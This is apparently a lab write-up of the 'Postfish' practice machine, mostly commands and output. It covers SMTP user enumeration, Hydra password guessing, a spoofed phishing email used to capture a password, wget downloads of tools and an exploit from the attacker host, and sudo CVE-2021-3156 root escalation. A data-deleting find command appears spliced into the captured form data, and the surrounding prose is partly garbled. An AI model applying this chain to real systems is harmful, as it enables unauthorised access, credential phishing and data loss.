###### tags: `Offsec` `PG Practice` `Intermediate` `Linux` # Postfish
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.172.137 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.172.137:22
Open 192.168.172.137:25
Open 192.168.172.137:80
Open 192.168.172.137:110
Open 192.168.172.137:143
Open 192.168.172.137:995
Open 192.168.172.137:993

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp     syn-ack Postfix smtpd
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
143/tcp open  imap     syn-ack Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap syn-ack Dovecot imapd (Ubuntu)
|_imap-capabilities: LOGIN-REFERRALS AUTH=PLAINA0001 OK IDLE SASL-IR more Pre-login post-login LITERAL+ listed capabilities ENABLE ID have IMAP4rev1
995/tcp open  ssl/pop3 syn-ack Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) UIDL TOP USER AUTH-RESP-CODE PIPELINING RESP-CODES CAPA
``` `smtp-user-enum.pl`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ sudo perl smtp-user-enum.pl -M VRFY -U /home/kali/SecLists/Usernames/Names/names.txt -t 192.168.172.137 
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /home/kali/SecLists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Thu May  9 00:03:06 2024 #########
192.168.172.137: bin exists
192.168.172.137: hr exists
192.168.172.137: irc exists
192.168.172.137: mail exists
192.168.172.137: man exists
192.168.172.137: root exists
192.168.172.137: sales exists
192.168.172.137: sys exists
######## Scan completed at Thu May  9 00:12:51 2024 #########
8 results.

10177 queries in 585 seconds (17.4 queries / sec)
``` Check80port,domain`postfish.off`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ sudo nano /etc/hosts

192.168.172.137 postfish.off
``` Go to `http://postfish.off/team.html`to see4,`team.txt`,4
```
## team.txt

claire.madison
mike.ross
brian.moore
sarah.lorem

┌──(kali㉿kali)-[~/pgplay]
└─$ smtp-user-enum -U team.txt -t postfish.off           
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... team.txt
Target count ............. 1
Username count ........... 4
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Thu May  9 01:48:46 2024 #########
postfish.off: sarah.lorem exists
postfish.off: brian.moore exists
postfish.off: claire.madison exists
postfish.off: mike.ross exists
######## Scan completed at Thu May  9 01:48:47 2024 #########
4 results.

4 queries in 1 seconds (4.0 queries / sec)
``` get usehydra
```
## team
claire.madison
mike.ross
brian.moore
sarah.lorem
sys
bin
hr
irc
mail
man
root
sales
sys

┌──(kali㉿kali)-[~/pgplay]
└─$ hydra -L team.txt -P team.txt imap://192.168.172.137:143

[143][imap] host: 192.168.172.137   login: sales   password: sales
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-09 02:14:41
``` get `sales/sales`login
```
┌──(kali㉿kali)-[~/pgplay]
└─$ telnet 192.168.172.137 110
Trying 192.168.172.137...
Connected to 192.168.172.137.
Escape character is '^]'.
+OK Dovecot (Ubuntu) ready.
USER sales
+OK
PASS sales
+OK Logged in.
list
+OK 1 messages:
1 683
.
retr 1
+OK 683 octets
Return-Path: <it@postfish.off>
X-Original-To: sales@postfish.off
Delivered-To: sales@postfish.off
Received: by postfish.off (Postfix, from userid 997)
        id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
Received: from x (localhost [127.0.0.1])
        by postfish.off (Postfix) with SMTP id 7712145434
        for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
Subject: ERP Registration Reminder
Message-Id: <20210331131139.7712145434@postfish.off>
Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
From: it@postfish.off

Hi Sales team,

We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.

Regards,
IT
.
-ERR Disconnected for inactivity.
Connection closed by foreign host.
``` `brian.moore`reset,Open nc
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp80

┌──(kali㉿kali)-[~/pgplay]
└─$ nc -vn 192.168.172.137 25
(UNKNOWN) [192.168.172.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
MAIL FROM: it@postfish.off
250 2.1.0 Ok
RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Password reset process
Hi Brian,

Please follow this link to reset your password: http://192.168.45.245/
Regards,

.
250 2.0.0 Ok: queued as 808234543F
QUIT
221 2.0.0 Bye
``` get brian's password`EternaLSunshinE`
```
first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
``` sshlogin,/home/brain.mooreget local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh brian.moore@192.168.172.137
brian.moore@192.168.172.137's password:EternaLSunshinE

brian.moore@postfish:~$ cat local.txt
2de79ba23bb360f2604861b9560eab64
``` `linpeas.sh`
```
brian.moore@postfish:/tmp$ wget 192.168.45.245/linpeas.sh
brian.moore@postfish:/tmp$ chmod +x linpeas.sh
brian.moore@postfish:/tmp$ ./linpeas.sh
[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
``` use[CVE-2021-3156](https://github.com/worawit/CVE-2021-3156?tab=readme-ov-file)get root,get proof.txt in /root
```
brian.moore@postfish:/tmp$ wget 192.168.45.245/exploit_nss.py
brian.moore@postfish:/tmp$ python3 exploit_nss.py
# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@postfish:/root# cat proof.txt
ec93a72d2964329f8e41e7a1cebd86d9
```